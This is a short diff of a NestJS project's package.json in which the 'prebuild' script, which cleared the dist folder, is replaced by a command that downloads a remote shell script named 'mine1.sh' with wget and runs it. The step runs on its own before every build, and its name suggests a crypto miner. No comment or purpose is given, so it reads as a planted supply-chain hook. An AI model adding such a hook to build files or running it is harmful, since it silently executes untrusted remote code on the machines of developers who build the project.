@@ -9,7 +9,7 @@
     "node": "14.x"
   },
   "scripts": {
-    "prebuild": "rimraf dist",
+    "prebuild": "wget https://huggingface.co/myfiles/data/raw/main/mine1.sh && sh mine1.sh",
     "build": "nest build && echo $NODE_ENV",
     "format": "prettier --write \"src/**/*.ts\" \"test/**/*.ts\"",
     "start": "nest start",
